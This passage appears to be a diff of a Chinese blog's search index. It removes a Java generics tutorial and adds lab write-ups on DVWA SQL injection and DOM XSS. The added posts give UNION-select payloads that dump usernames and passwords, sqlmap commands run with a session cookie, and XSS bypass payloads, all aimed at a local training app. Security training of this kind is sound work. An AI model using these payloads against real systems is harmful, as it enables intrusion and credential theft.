+<p>得到数据库中有两张表，<strong>guestbook</strong> 和 <strong>users</strong> 。</p>
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/7.png" alt="7"></p>
+</li>
+</ul>
+</li>
+<li><p>获取表中的<strong>字段名</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select column_name,2 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
 
-]]></content>
+<p>可以看到有很多的字段，最有用的应该是 <strong>user</strong> 和 <strong>password</strong></p>
+<img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/9.png" alt="9.png" style="zoom:70%;"></li>
+<li><p>查找数据</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select user,password from users #</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/9.png" alt="9"></p>
+</li>
+<li><p>MD5 解密</p>
+</li>
+</ul>
+<hr>
+<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><ul>
+<li><p>第一步还是有源码就分析源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	<span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$id</span> = mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get results</span></span><br><span class="line">	<span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Display values</span></span><br><span class="line">		<span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">		<span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for end user</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="variable">$number_of_rows</span> = mysqli_fetch_row( <span class="variable">$result</span> )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>此级别改为了 POST 提交数据</li>
+<li>对 id 进行了 mysqli_real_escape_string 转义，但我们依然可以发现它的注入类型是数字型注入。</li>
+<li>使用下拉链表选择id值（没啥d用）。</li>
+</ul>
+</li>
+<li><p>抛弃源码，判断注入类型</p>
+<ul>
+<li><p>输入 <code>1</code> 测试一下</p>
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/15.png" alt="15"></p>
+<p>可以看出来成功回显。</p>
+</li>
+<li><p>再输入<code>1&#39;</code>测试</p>
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/16.png" alt="16"></p>
+<p>报错，我们看过了源码，所以知到这是 mysql 转义的结果，平时我们注入的时候是根本看不到源码的，这时候我们抛弃源码思考的话，会猜测它可能是字符型注入。但是字符型注入的话和 LOW 等级的就一样了。</p>
+</li>
+<li><p>我们输入<code>1abc&#39;</code>测试</p>
+<img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/17.png" alt="17" style="zoom:50%;">
+
+<p>所以我们就发现它不仅仅是转义id，符号也转义了。所以可以判断基本<strong>不算是字符型注入</strong>。</p>
+</li>
+<li><p>确认是否是数字型</p>
+<p>若为数字型，那我们可以进行 <code>1+1=2</code> 的运算的，如图：</p>
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/18.png" alt="18" style="zoom:50%;"><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/19.png" alt="19" style="zoom:150%;"></p>
+<p>可以发现二者回显是一样的。</p>
+<ul>
+<li>那我们可以断定它就是数字型注入</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>构造payload注入，绕过<code>&#39;</code>的转义。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union select column_name,2 from information_schema.columns where table_name=&#x27;users&#x27;7573657273</span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><hr>
+<h2 id="sqlmap-注入"><a href="#sqlmap-注入" class="headerlink" title="sqlmap 注入"></a>sqlmap 注入</h2><hr>
+<h3 id="Low-amp-amp-Medium"><a href="#Low-amp-amp-Medium" class="headerlink" title="Low &amp;&amp; Medium"></a>Low &amp;&amp; Medium</h3><p>Low 和 Medium 是一样的，把 cookie 改一下就行，这里演示以 low 为例。</p>
+<ul>
+<li>检测是否存在SQL注入漏洞</li>
+</ul>
+<p>需要注意的点：dvwa需要登录才能访问漏洞测试页面，所以使用sqlmap时需要提交登录后的cookie</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> </span><br><span class="line">--cookie=<span class="string">&quot;security=low;PHPSESSID=tmjjudclk48ic7gi3ct1fpkl1u&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/10.png" alt="10"></p>
+<p>检测存在SQL注入点id(GET),数据库类型为mysql。</p>
+<ul>
+<li><p>爆数据库</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> </span><br><span class="line">--cookie=<span class="string">&quot;security=low;PHPSESSID=tmjjudclk48ic7gi3ct1fpkl1u&quot;</span> -dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/11.png" alt="11"></p>
+</li>
+<li><p>爆数据表</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> </span><br><span class="line">--cookie=<span class="string">&quot;security=low;PHPSESSID=tmjjudclk48ic7gi3ct1fpkl1u&quot;</span> -D dvwa -tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/12.png" alt="12"></p>
+</li>
+<li><p>爆字段</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> </span><br><span class="line">--cookie=<span class="string">&quot;security=low;PHPSESSID=tmjjudclk48ic7gi3ct1fpkl1u&quot;</span> -D dvwa -T users -columns</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/13.png" alt="13"></p>
+</li>
+<li><p>爆字段内容</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> </span><br><span class="line">--cookie=<span class="string">&quot;security=low;PHPSESSID=tmjjudclk48ic7gi3ct1fpkl1u&quot;</span> -D dvwa -T users -C <span class="string">&quot;user,password&quot;</span> -dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/14.png" alt="14"></p>
+</li>
+</ul>
+<hr>
+<h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3>]]></content>
       <tags>
-        <tag>-Java</tag>
+        <tag>-DVWA</tag>
+        <tag>-SQL注入</tag>
       </tags>
   </entry>
   <entry>
-    <title>Java-泛型</title>
-    <url>/2022/04/17/Java-%E6%B3%9B%E5%9E%8B/</url>
-    <content><![CDATA[<h2 id="Java-泛型"><a href="#Java-泛型" class="headerlink" title="Java-泛型"></a>Java-泛型</h2><hr>
-<p>参考来自：</p>
-<p><a href="https://jwt1399.top/posts/9855.html#toc-heading-28">https://jwt1399.top/posts/9855.html#toc-heading-28</a><br><a href="https://www.runoob.com/java/java-generics.html">https://www.runoob.com/java/java-generics.html</a><br><a href="https://juejin.cn/post/6844903925666021389#heading-6">https://juejin.cn/post/6844903925666021389#heading-6</a></p>
+    <title>DVWA-XSS(DOM)</title>
+    <url>/2022/04/29/DVWA-XSS-DOM/</url>
+    <content><![CDATA[<h1 id="DVWA-XSS-DOM"><a href="#DVWA-XSS-DOM" class="headerlink" title="DVWA-XSS(DOM)"></a>DVWA-XSS(DOM)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。</p>
+<p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过<strong>JS脚本</strong>对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p>
 <hr>
-<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>泛型的本质是参数化类型，就是操作的数据类型被指定为一个参数，也就是说我们可以使用<strong>泛型</strong>对整型数组、字符串数组甚至其它类型的数组进行排序。</p>
-<h3 id="使用泛型的目的"><a href="#使用泛型的目的" class="headerlink" title="使用泛型的目的"></a>使用泛型的目的</h3><p>可以避免在运行时强制类型转换发生类型转换异常(ClassCastException)</p>
+<p>参考：</p>
+<p><a href="https://www.freebuf.com/articles/web/253358.html">https://www.freebuf.com/articles/web/253358.html</a></p>
 <hr>
-<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>在 ArrayList 中，添加 3 个 Dog 对象，Dog 对象含有 name 和 age，并输出 name 和age (要求使用getXxx())</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">public class Generic01 &#123;</span></span><br><span class="line"><span class="comment">    public static void main(String[] args)&#123;</span></span><br><span class="line"><span class="comment">        ArrayList arrayList = new ArrayList();</span></span><br><span class="line"><span class="comment">        arrayList.add(new Dog(&quot;Dog&quot;,1));</span></span><br><span class="line"><span class="comment">        arrayList.add(new Dog(&quot;DDogg&quot;,1));					//传统方法</span></span><br><span class="line"><span class="comment">        arrayList.add(new Dog(&quot;DDDoggg&quot;,1));</span></span><br><span class="line"><span class="comment">        for(Object o : arrayList)&#123;</span></span><br><span class="line"><span class="comment">            Dog dog = (Dog) o;</span></span><br><span class="line"><span class="comment">            System.out.println(dog.getName());</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">*/</span>   </span><br><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Generic01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        ArrayList&lt;Dog&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        arrayList.add(<span class="keyword">new</span> Dog(<span class="string">&quot;Dog2&quot;</span>,<span class="number">1</span>));					<span class="comment">//使用泛型</span></span><br><span class="line">        arrayList.add(<span class="keyword">new</span> Dog(<span class="string">&quot;DDogg2&quot;</span>,<span class="number">1</span>));</span><br><span class="line">        arrayList.add(<span class="keyword">new</span> Dog(<span class="string">&quot;DDDoggg2&quot;</span>,<span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span> (Dog dog : arrayList)&#123;   <span class="comment">//增强for循环</span></span><br><span class="line">            System.out.println(dog.getName());</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    </span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Dog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Dog</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><ul>
+<li>查看服务端源代码，发现什么都没有，那我们可以尝试直接注入</li>
+</ul>
+<p><img src="https://colson-max.github.io/2022/04/29/DVWA-XSS-DOM/1.png" alt="1"></p>
+<ul>
+<li><p>主页面随便选个 English ，点击 Select</p>
+<img src="https://colson-max.github.io/2022/04/29/DVWA-XSS-DOM/2.png" alt="2" style="zoom:67%;"></li>
+</ul>
+<p>​    我们发现上方 url 处多了一串字符 “ <strong>?default=English</strong> “</p>
+<ul>
+<li><p>我们可以直接构造语句</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">default=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><h4 id="1-编译时，检查添加元素的类型，提高了安全性"><a href="#1-编译时，检查添加元素的类型，提高了安全性" class="headerlink" title="1. 编译时，检查添加元素的类型，提高了安全性"></a>1. 编译时，检查添加元素的类型，提高了安全性</h4><h4 id="2-不再提示编译警告"><a href="#2-不再提示编译警告" class="headerlink" title="2. 不再提示编译警告"></a>2. 不再提示编译警告</h4><h4 id="3-减少了类型转换的次数，提高效率"><a href="#3-减少了类型转换的次数，提高效率" class="headerlink" title="3. 减少了类型转换的次数，提高效率"></a>3. 减少了类型转换的次数，提高效率</h4><p>​    不使用泛型 Dog -&gt; Object -&gt; Dog //放入到 ArrayList 会先转成 Object，在取出时，还需要转换成 Dog<br>​    使用泛型 Dog-&gt; Dog -&gt; Dog //放入和取出时，不需要类型转换，提高效率</p>
+<img src="https://colson-max.github.io/2022/04/29/DVWA-XSS-DOM/3.png" alt="3" style="zoom:67%;"></li>
+</ul>
 <hr>
-<h3 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h3><p>泛型默认 Object</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span>&lt;&gt;</span>&#123;			<span class="comment">// 创建对象时没有指定类型，默认是 Object</span></span><br><span class="line">    E s;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Dog</span><span class="params">(E s)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.s = s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>源码分析：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">	<span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># Do not allow script tags</span></span><br><span class="line">	<span class="keyword">if</span> (stripos (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">		header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List List = <span class="keyword">new</span> List();</span><br><span class="line"><span class="comment">//       等价于</span></span><br><span class="line">List&lt;Object&gt; List = <span class="keyword">new</span> List&lt;&gt;();</span><br></pre></td></tr></table></figure>
-
-<p>泛型类型必须是<strong>引用类型</strong>（非基本数据类型）</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();	<span class="comment">//正确</span></span><br><span class="line">List&lt;Int&gt; list = <span class="keyword">new</span> ArraayList&lt;<span class="keyword">int</span>&gt;();	<span class="comment">//错误</span></span><br></pre></td></tr></table></figure>
-
-<p>使用形式</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> List&lt;Integer&gt;();</span><br><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> List&lt;&gt;();<span class="comment">//推荐使用简写</span></span><br></pre></td></tr></table></figure>
-
-<p>由于使用自定义泛型的类，只有在实例化的时候才知道这个类型参数是什么，所以导致</p>
-<p>（1）使用泛型的数组不能初始化<br>（2）静态方法和静态属性并不能使用泛型</p>
-<h3 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h3><p>eg:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *          泛型接口的定义格式：      修饰符 interface 接口名&lt;数据类型&gt;&#123;</span></span><br><span class="line"><span class="comment"> *          </span></span><br><span class="line"><span class="comment"> *                                      &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Inter</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">(T t)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *      子类是泛型类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterImpl</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">Inter</span>&lt;<span class="title">E</span>&gt;</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">(E t)</span></span>&#123;</span><br><span class="line">        System.out.println(t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Inter&lt;String&gt; inter = <span class="keyword">new</span> Inter&lt;String&gt;();</span><br><span class="line">inter.show(<span class="string">&quot;hello&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<h3 id="泛型方法"><a href="#泛型方法" class="headerlink" title="泛型方法"></a>泛型方法</h3><p>可以使用类声明的泛型，也可以使用自己的声明泛型</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fish</span>&lt;<span class="title">T</span>, <span class="title">R</span>&gt; </span>&#123;		<span class="comment">//泛型类 </span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;		<span class="comment">//普通方法 </span></span><br><span class="line">	&#125; </span><br><span class="line">	<span class="function"><span class="keyword">public</span>&lt;U,M&gt; <span class="keyword">void</span> <span class="title">eat</span><span class="params">(U u, M m)</span> </span>&#123;		<span class="comment">//泛型方法 </span></span><br><span class="line">	&#125; </span><br><span class="line">	<span class="comment">/**说明 </span></span><br><span class="line"><span class="comment"> 	*1. 下面hi 方法不是泛型方法 </span></span><br><span class="line"><span class="comment"> 	*2. 是hi 方法使用了类声明的泛型 </span></span><br><span class="line"><span class="comment"> 	*/</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hi</span><span class="params">(T t)</span> </span>&#123; </span><br><span class="line">	&#125; </span><br><span class="line">	<span class="comment">//泛型方法，可以使用类声明的泛型，也可以使用自己声明泛型 </span></span><br><span class="line">	<span class="function"><span class="keyword">public</span>&lt;K&gt; <span class="keyword">void</span> <span class="title">hello</span><span class="params">(R r, K k)</span> </span>&#123;</span><br><span class="line">		System.out.println(r.getClass());<span class="comment">//ArrayList </span></span><br><span class="line">		System.out.println(k.getClass());<span class="comment">//Float </span></span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//例子</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">fun</span><span class="params">(T t)</span></span>&#123;      <span class="comment">//可以接收任意类型的数据</span></span><br><span class="line">        <span class="keyword">return</span> t;       <span class="comment">//直接把参数返回</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericsDemo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Demo d = <span class="keyword">new</span> Demo();            <span class="comment">//实例化 Demo 对象</span></span><br><span class="line">        String str = d.fun(<span class="string">&quot;Tom&quot;</span>);      <span class="comment">//传递字符串</span></span><br><span class="line">        <span class="keyword">int</span> i = d.fun(<span class="number">30</span>);          <span class="comment">//传递数字，自动装箱</span></span><br><span class="line">        System.out.println(str);        </span><br><span class="line">        System.out.println(i);          <span class="comment">//输出</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="源码中泛型使用"><a href="#源码中泛型使用" class="headerlink" title="源码中泛型使用"></a>源码中泛型使用</h3><hr>
-<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="定义Employee类"><a href="#定义Employee类" class="headerlink" title="定义Employee类"></a>定义Employee类</h4><p>该类包含: private成员变量name,sal,birthday, 其中birthday为MyDate类的对象<br>为每一个属性定义getter, setter方法<br>重写toString方法输出name, sal, birthday</p>
-<h4 id="定义MyDate类"><a href="#定义MyDate类" class="headerlink" title="定义MyDate类"></a>定义MyDate类</h4><p>包含: private成员变量month,day,year<br>并为每一个属性定义getter,setter方法</p>
-<h4 id="创建该类的3个对象，并把这些对象放入ArrayList集合中-ArrayList需使用泛型来定义"><a href="#创建该类的3个对象，并把这些对象放入ArrayList集合中-ArrayList需使用泛型来定义" class="headerlink" title="创建该类的3个对象，并把这些对象放入ArrayList集合中(ArrayList需使用泛型来定义)"></a>创建该类的3个对象，并把这些对象放入ArrayList集合中(ArrayList需使用泛型来定义)</h4><p>对集合中的元素进行排序，并遍历输出<br>排序方式:调用ArrayList 的sort方法，传入Comparator对象[使用泛型]，先按照<br>name排序，如果name相同，则按生日日期的先后排序。 即:定制排序</p>
-<p>代码：</p>
-<p><a href="https://github.com/Colson-max/Java-Generic_Employeee">https://github.com/Colson-max/Java-Generic_Employeee</a></p>
+<p>我们可以发现<code>&lt;script&gt;</code>被过滤掉了。</p>
+<ul>
+<li><p>那我们可以使用闭合<code>&lt;/option&gt;&lt;/select&gt;</code>标签构造xss事件。</p>
+</li>
+<li><p>键入 <code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;iframe onload=alert(/xss/)&gt;</code></p>
+<p><img src="https://colson-max.github.io/2022/04/29/DVWA-XSS-DOM/4.png" alt="4"></p>
+</li>
+</ul>
 <hr>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>一样的先分析源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># White list the allowable languages</span></span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">			<span class="comment"># ok</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 